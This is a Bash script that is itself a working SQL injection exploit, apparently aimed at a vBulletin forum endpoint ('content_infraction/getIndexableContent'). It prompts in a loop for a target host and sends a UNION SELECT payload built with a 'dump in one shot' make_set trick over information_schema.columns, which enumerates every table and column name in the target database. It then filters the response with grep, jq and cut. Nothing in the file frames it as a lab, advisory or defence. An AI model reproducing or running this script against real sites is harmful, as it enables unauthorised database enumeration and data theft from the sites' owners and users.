remove_word() (
  set -f
  IFS=' '

  s=$1
  w=$2

  set -- $1
  for arg do
    shift
    [ "$arg" = "$w" ] && continue
    set -- "$@" "$arg"
  done

  printf '%s\n' "$*"
)

while true; do
    echo -en "-> "
    read ip
    # dios
    remove=$(curl "${ip}/ajax/api/content_infraction/getIndexableContent" -i -H 'X-Requested-With: XMLHttpRequest' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' -d "nodeId[nodeid]=1 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x0a,table_name,column_name)),@),19,20,21,22,23,24,25,26,27 --" -s | grep useractivationid | jq -r '.[]' | grep useractivationid | cut -f2 -d ',')
    remove_word "useractivation" "$remove"
done
